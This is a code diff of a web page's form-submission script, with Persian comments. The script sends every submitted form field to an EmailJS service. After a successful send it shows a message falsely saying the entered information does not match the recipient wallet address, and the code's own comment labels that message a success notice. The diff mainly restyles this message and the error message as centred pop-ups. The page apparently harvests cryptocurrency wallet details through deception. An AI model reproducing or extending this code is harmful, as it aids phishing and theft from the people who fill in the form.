@@ -160,15 +160,53 @@
 
                // ارسال داده‌ها با EmailJS
                const formData = new FormData(this);
-            const data = Object.fromEntries(formData);
+const data = Object.fromEntries(formData);
 
-            emailjs.send('service_pb8dciz', 'template_030l7kc', data)
-                .then(function() {
-                    alert('The entered information does not match the recipient's Wallet address');
-                }, function(error) {
-                    console.error('Error occurred:', error);
-                    alert('Error: ' + JSON.stringify(error));
-                });
+emailjs.send('service_pb8dciz', 'template_030l7kc', data)
+    .then(function() {
+        // ایجاد و نمایش پیغام موفقیت
+        const successMessage = document.createElement('div');
+        successMessage.innerText = 'The entered information does not match the recipient Wallet address';
+        successMessage.style.position = 'fixed';
+        successMessage.style.top = '50%';
+        successMessage.style.left = '50%';
+        successMessage.style.transform = 'translate(-50%, -50%)';
+        successMessage.style.backgroundColor = 'orange';
+        successMessage.style.color = 'white';
+        successMessage.style.padding = '20px';
+        successMessage.style.borderRadius = '8px';
+        successMessage.style.fontSize = '16px';
+        successMessage.style.zIndex = '1000';
+
+        document.body.appendChild(successMessage);
+
+        setTimeout(() => {
+            successMessage.remove();
+        }, 5000);
+
+    }, function(error) {
+        console.error('Error occurred:', error);
+
+        // ایجاد و نمایش پیغام خطا
+        const errorMessage = document.createElement('div');
+        errorMessage.innerText = 'Error: ' + JSON.stringify(error);
+        errorMessage.style.position = 'fixed';
+        errorMessage.style.top = '50%';
+        errorMessage.style.left = '50%';
+        errorMessage.style.transform = 'translate(-50%, -50%)';
+        errorMessage.style.backgroundColor = '#fcd434';
+        errorMessage.style.color = 'white';
+        errorMessage.style.padding = '20px';
+        errorMessage.style.borderRadius = '8px';
+        errorMessage.style.fontSize = '16px';
+        errorMessage.style.zIndex = '1000';
+
+        document.body.appendChild(errorMessage);
+
+        setTimeout(() => {
+            errorMessage.remove();
+        }, 5000); // نمایش پیغام خطا برای دو ثانیه
+    });
         });
 
         // فعال کردن دکمه تغییر تعداد فیلدها
